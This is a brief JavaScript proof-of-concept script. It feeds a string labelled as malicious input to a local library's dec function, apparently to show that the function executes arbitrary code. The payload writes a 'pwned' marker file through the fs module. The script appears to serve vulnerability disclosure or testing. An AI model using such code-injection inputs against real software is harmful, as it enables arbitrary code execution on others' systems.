const myLibrary = require('./index');

// Malicious input
const maliciousInput = 'require("fs").writeFileSync("pwned", "pwned")';

// This will execute the malicious code
try {
   myLibrary.dec(maliciousInput);
   } catch (e) {
     console.error('Error:', e.message);
}
